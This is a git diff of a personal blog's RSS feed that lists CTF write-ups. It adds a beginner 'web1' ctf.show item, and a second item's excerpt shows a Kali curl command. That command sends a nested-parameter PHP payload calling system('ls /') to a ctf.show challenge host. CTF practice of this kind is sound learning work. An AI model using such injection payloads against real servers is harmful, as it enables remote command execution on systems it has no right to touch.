@@ -1,5 +1,11 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Mon, 17 Nov 2025 14:13:50 +0000</lastBuildDate><managingEditor>Ayx博客</managingEditor><ttl>60</ttl><webMaster>Ayx博客</webMaster><item><title>WriteUp_新手必刷_菜狗杯 web签到 100</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_-xin-shou-bi-shua-_-cai-gou-bei-%20web-qian-dao-%20100.html</link><description>```
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Wed, 19 Nov 2025 10:04:39 +0000</lastBuildDate><managingEditor>Ayx博客</managingEditor><ttl>60</ttl><webMaster>Ayx博客</webMaster><item><title>WriteUp_WEB入门_web1_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_WEB-ru-men-_web1_ctf.show.html</link><description>```
+web1
+10
+信息搜集
+此题为 【从0开始学web】系列第一题
+此系列题目从最基础开始，题目遵循循序渐进的原则
+希望对学习CTF WEB的同学有所帮助。</description><guid isPermaLink="true">https://Ayx03.github.io/Gmeek/post/WriteUp_WEB-ru-men-_web1_ctf.show.html</guid><pubDate>Wed, 19 Nov 2025 10:04:00 +0000</pubDate></item><item><title>WriteUp_新手必刷_菜狗杯 web签到 100</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_-xin-shou-bi-shua-_-cai-gou-bei-%20web-qian-dao-%20100.html</link><description>```
 ┌──(kali㉿AyxGaming)-[~]
 └─$ curl -b 'CTFshow-QQ群:=A'      -d 'A=B'      --data-urlencode 'C[6][0][7][5][8][0][9][4][4]=system('ls /');'      'http://4592fb23-ed52-458f-bb61-5b995b590787.challenge.ctf.sh
 ow/?B=C'
